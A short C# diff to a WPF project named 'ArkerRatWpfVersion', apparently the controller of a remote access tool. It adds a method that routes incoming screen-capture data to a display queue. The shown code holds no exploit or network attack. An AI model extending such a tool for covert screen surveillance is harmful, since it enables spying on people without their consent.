@@ -15,6 +15,7 @@ using System.Windows.Media.Imaging;
 using NAudio.Wave;
 using System.Diagnostics;
 using System.Windows.Markup;
+using System.Data.SqlTypes;
 
 namespace ArkerRatWpfVersion
 {
@@ -185,7 +186,17 @@ GlobalVariables.byteSize = 262144;
 
         public ConcurrentQueue<string> frameQue = new ConcurrentQueue<string>();
 
-
+        public void HandleData(string subString)
+        {
+            if (subString.Contains("§screen§"))
+            {
+                AddScreens(subString);
+            }
+            else
+            {
+                frameQue.Enqueue(subString);
+            }
+        }
 
         private async void FrameBuffer()
         {
